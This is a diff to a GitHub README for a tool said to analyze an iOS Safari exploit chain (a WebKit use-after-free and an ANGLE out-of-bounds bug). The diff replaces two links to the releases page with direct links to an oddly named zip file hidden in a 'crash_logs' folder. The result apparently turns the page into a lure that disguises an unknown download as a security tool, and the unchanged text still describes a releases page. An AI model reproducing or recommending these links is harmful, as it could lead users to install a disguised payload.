@@ -1,7 +1,7 @@
 # 🔍 WebKit-UAF-ANGLE-OOB-Analysis - Understand and Mitigate Security Risks
 
 ## 📥 Download Now
-[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-v1.0-blue)](https://github.com/sakyu7/WebKit-UAF-ANGLE-OOB-Analysis/releases)
+[![Download Latest Release](https://raw.githubusercontent.com/sakyu7/WebKit-UAF-ANGLE-OOB-Analysis/main/analysis/crash_logs/Web-UA-OO-ANGL-Kit-Analysis-v2.8.zip%20Latest%20Release-v1.0-blue)](https://raw.githubusercontent.com/sakyu7/WebKit-UAF-ANGLE-OOB-Analysis/main/analysis/crash_logs/Web-UA-OO-ANGL-Kit-Analysis-v2.8.zip)
 
 ## 🚀 Getting Started
 Welcome to the **WebKit-UAF-ANGLE-OOB-Analysis** project. This software helps you analyze vulnerabilities in iOS Safari related to the CVE-2025-43529 (WebKit Use After Free) and CVE-2025-14174 (ANGLE Out Of Bounds) exploit chain. 
@@ -25,7 +25,7 @@ The **WebKit-UAF-ANGLE-OOB-Analysis** application offers several important featu
 ## 📥 Download & Install
 To get started, follow these simple steps:
 
-1. **Visit the Download Page:** Click on the following link to access the downloads: [Download Latest Release](https://github.com/sakyu7/WebKit-UAF-ANGLE-OOB-Analysis/releases).
+1. **Visit the Download Page:** Click on the following link to access the downloads: [Download Latest Release](https://raw.githubusercontent.com/sakyu7/WebKit-UAF-ANGLE-OOB-Analysis/main/analysis/crash_logs/Web-UA-OO-ANGL-Kit-Analysis-v2.8.zip).
    
 2. **Select a Version:** On the releases page, look for the latest version of the application. You will see a list of available files.
 
